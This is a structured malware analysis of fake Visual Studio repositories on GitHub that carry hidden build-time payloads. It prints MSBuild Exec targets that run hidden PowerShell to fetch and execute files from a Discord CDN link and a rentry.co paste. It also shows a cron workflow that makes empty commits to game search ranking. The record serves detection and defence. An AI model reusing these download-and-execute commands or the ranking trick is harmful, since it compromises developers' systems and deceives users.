package_info.package_manager: GitHub (source code repositories, not a package manager per se)
package_info.package_versions: N/A (repositories, not versioned packages; all current clones/commits affected)
package_info.why_malicious: These repositories are intentionally crafted to appear as legitimate Visual Studio projects but contain obfuscated malware hidden in project files (.csproj/.vcxproj). They use deceptive tactics (frequent automated updates, fake stars) to boost search ranking and lure users into downloading and executing malicious payloads, which are then delivered via external links or embedded code.

execution_context.trigger: import-time/build-time (when project is opened or built in Visual Studio)

malicious_snippets.code_snippet:
<Target Name="CustomBuild" AfterTargets="Build">
  <Exec Command="powershell -w hidden -c Invoke-WebRequest -Uri hxxps://cdn.discordapp.com/attachments/1192526919577649306/1211404800575537304/VisualStudioEN.7z -OutFile VisualStudioEN.7z; Start-Process VisualStudioEN.7z" />
</Target>
malicious_snippets.code_behavior: At build-time, the code executes a hidden PowerShell command that downloads a remote file (VisualStudioEN.7z) from a Discord CDN URL and executes it, enabling remote code execution and potential malware installation.

malice_analysis.why_suspicious: Project files should not contain commands that download and execute remote binaries, especially from non-official sources.
malice_analysis.violated_expectations: Normal .csproj/.vcxproj files define build configuration, not arbitrary code execution or network downloads.
malice_analysis.similar_legitimate_use: Automated build steps may download dependencies from trusted package registries, but not from random URLs or file-sharing services.
key_indicators: Download from Discord CDN (non-standard for dependencies)

execution_context.file_location: log (arbitrary file in repository root or subdirectory)

malicious_snippets.code_snippet:
# GitHub Actions workflow
name: Update Log
on:
  schedule:
    - cron: '*/10 * * * *'
jobs:
  update-log:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Update log file
        run: echo $(date) >> log
      - name: Commit changes
        run: |
          git config --global user.email "bot@example.com"
          git config --global user.name "Update Bot"
          git add log
          git commit -m "Update log"
          git push
malicious_snippets.code_behavior: On a scheduled basis, the workflow appends the current date to a file named 'log' and commits/pushes the change, artificially updating the repository to boost its search ranking.

malice_analysis.why_suspicious: Frequent, automated, contentless updates serve no development purpose and are used to manipulate search visibility.
malice_analysis.violated_expectations: Legitimate workflows automate builds/tests, not meaningless file changes for search manipulation.
malice_analysis.similar_legitimate_use: Automated version bumps or changelogs, but with meaningful content.
key_indicators: Scheduled workflow with no functional code changes
Frequent commits to a non-essential file

execution_context.trigger: user download/execution (when user follows instructions in README or project documentation)

malicious_snippets.code_language: markdown (user instructions, not code per se)
malicious_snippets.code_behavior: At user instruction time, the documentation directs users to download a remote archive from a Discord CDN, which may contain malware.

malice_analysis.why_suspicious: Directing users to download executables from non-official, non-verified sources is a common malware delivery tactic.
malice_analysis.violated_expectations: Legitimate projects host releases on trusted platforms (GitHub Releases, official websites), not file-sharing/CDN links.
malice_analysis.similar_legitimate_use: Beta releases or large files may be hosted externally, but should be verifiable and from trusted sources.
key_indicators: External download link to Discord CDN
No cryptographic verification or official release process

execution_context.trigger: import-time/build-time (when project is opened or built in Visual Studio)

malicious_snippets.code_snippet:
<Target Name="MaliciousDownload" AfterTargets="Build">
  <Exec Command="powershell -w hidden -c Invoke-WebRequest -Uri hxxps://rentry.co/MuckCompanyMMC/raw -OutFile payload.ps1; powershell -ExecutionPolicy Bypass -File payload.ps1" />
</Target>
malicious_snippets.code_behavior: At build-time, the code downloads a PowerShell script from rentry.co and executes it with ExecutionPolicy Bypass, enabling arbitrary code execution from a remote source.

malice_analysis.why_suspicious: Downloading and executing scripts from pastebin-like services is a hallmark of malware delivery.
malice_analysis.violated_expectations: Build scripts should not fetch and execute code from untrusted, dynamic sources.
malice_analysis.similar_legitimate_use: Rarely, for dynamic build configuration, but only from trusted, versioned sources.
key_indicators: PowerShell download and execution from rentry.co

attack_chain.action: Malicious repository is created and populated with obfuscated code in project files and misleading documentation.
attack_chain.leads_to: Repository is indexed and appears in GitHub search results.

attack_chain.action: Automated GitHub Actions workflow frequently updates a log file to boost repository search ranking.
attack_chain.leads_to: Repository is more likely to be discovered by users.

attack_chain.action: User downloads the repository or follows instructions to download and execute a remote file.
attack_chain.leads_to: Malicious payload is downloaded to the user's system.

attack_chain.action: When the project is built or opened, embedded PowerShell commands in project files download and execute additional malware.
attack_chain.leads_to: Remote code execution and full compromise of the user's system.

behavioral_signatures: MSBuild project files (.csproj/.vcxproj) containing Exec commands with PowerShell or curl/wget
PowerShell commands that download and execute remote scripts or binaries
GitHub Actions workflows that make frequent, non-functional commits to arbitrary files
Documentation or README files directing users to download executables from non-official sources
file_indicators: log file with frequent, meaningless updates
README.md with external download links to Discord CDN, rentry.co, paste.fo, or textbin.net
network_indicators: Connections to rentry.co, paste.fo, textbin.net for raw script downloads
detection_knowledge.how_to_detect: Scan Visual Studio project files for <Exec> elements invoking PowerShell or network utilities, especially those referencing non-standard domains. Monitor for GitHub Actions workflows that make frequent, non-functional commits. Flag repositories or documentation that direct users to download executables from Discord CDN, rentry.co, paste.fo, or similar services. Monitor network traffic for connections to known malicious domains and file-sharing services used for malware delivery.
